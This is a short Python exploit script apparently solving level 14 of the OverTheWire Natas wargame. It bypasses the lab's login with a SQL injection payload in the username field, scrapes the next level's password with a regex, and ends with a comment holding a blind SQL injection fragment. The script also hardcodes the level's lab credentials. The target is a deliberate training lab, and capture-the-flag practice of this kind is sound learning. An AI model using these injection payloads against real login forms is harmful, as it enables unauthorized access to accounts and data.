from pwn import *
import requests
import re

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas15 password, Hold on! ")
session = requests.session()
content = session.get(url , auth = (username, password)).text
web = session.post(url, data = {"username" : '" OR 1=1 -- -' , "password" : "password", "submit" : "Login"}, auth = (username, password)).text
#print(web)
print("The password for natas15 is === " + re.findall("[A-Za-z0-9]{32}", web)[1])

'''

Basic SQL query thing

'''

#natas16" AND BINARY password LIKE "W%